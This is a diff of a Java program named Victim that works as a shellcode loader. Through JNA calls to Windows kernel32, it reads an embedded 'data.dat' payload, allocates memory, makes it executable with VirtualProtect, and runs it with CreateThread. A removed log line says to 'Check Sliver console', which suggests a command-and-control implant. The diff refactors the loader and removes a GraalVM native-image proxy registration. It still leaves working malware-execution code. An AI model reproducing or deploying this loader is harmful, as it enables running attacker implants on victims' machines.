@@ -4,27 +4,10 @@ import com.sun.jna.Native;
 import com.sun.jna.win32.StdCallLibrary;
 import java.io.InputStream;
 
-// GraalVM SDK Imports for the Feature
-import org.graalvm.nativeimage.hosted.Feature;
-import org.graalvm.nativeimage.hosted.RuntimeProxySupport;
-
 public class Victim {
 
-    /**
-     * This internal class is a GraalVM "Feature".
-     * It runs DURING the native-image build process to manually
-     * register the JNA proxy for Kernel32.
-     */
-    static class ProxyRegistrationFeature implements Feature {
-        @Override
-        public void beforeAnalysis(BeforeAnalysisAccess access) {
-            // This is the programmatic equivalent of the proxy-config.json
-            RuntimeProxySupport.register(shell.Victim.Kernel32.class, com.sun.jna.Library.class);
-        }
-    }
-
     public interface Kernel32 extends StdCallLibrary {
-        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);
+        // We will load this inside main to be safer
         long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
         long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
         int WaitForSingleObject(long hHandle, int dwMilliseconds);
@@ -33,37 +16,26 @@ public class Victim {
 
     public static void main(String[] args) {
         try {
+            // Load JNA instance here
+            Kernel32 k32 = Native.load("kernel32", Kernel32.class);
+
             System.out.println("[*] Extracting embedded payload...");
             InputStream is = Victim.class.getResourceAsStream("/data.dat");
-            if (is == null) {
-                System.out.println("[!] Error: data.dat not found in resources!");
-                return;
-            }
+            if (is == null) return;
             byte[] shellcode = is.readAllBytes();
-            System.out.println("[*] Payload size: " + shellcode.length + " bytes");
-
-            // Windows Constants
-            int MEM_COMMIT = 0x1000;
-            int MEM_RESERVE = 0x2000;
-            int PAGE_READWRITE = 0x04;
-            int PAGE_EXECUTE_READ = 0x20;
 
             System.out.println("[*] Allocating memory...");
-            long address = Kernel32.INSTANCE.VirtualAlloc(0, shellcode.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            long address = k32.VirtualAlloc(0, shellcode.length, 0x3000, 0x04);
 
-            System.out.println("[*] Writing payload to memory...");
             com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
             pointer.write(0, shellcode, 0, shellcode.length);
 
-            System.out.println("[*] Setting memory to executable...");
             com.sun.jna.ptr.IntByReference oldProtect = new com.sun.jna.ptr.IntByReference();
-            Kernel32.INSTANCE.VirtualProtect(address, shellcode.length, PAGE_EXECUTE_READ, oldProtect);
+            k32.VirtualProtect(address, shellcode.length, 0x20, oldProtect);
 
-            System.out.println("[*] Executing thread. Check Sliver console!");
-            long threadHandle = Kernel32.INSTANCE.CreateThread(0, 0, address, 0, 0, 0);
-
-            // Keeps the Java process alive while the shellcode runs
-            Kernel32.INSTANCE.WaitForSingleObject(threadHandle, -1);
+            System.out.println("[*] Executing thread...");
+            long threadHandle = k32.CreateThread(0, 0, address, 0, 0, 0);
+            k32.WaitForSingleObject(threadHandle, -1);
 
         } catch (Exception e) {
             e.printStackTrace();
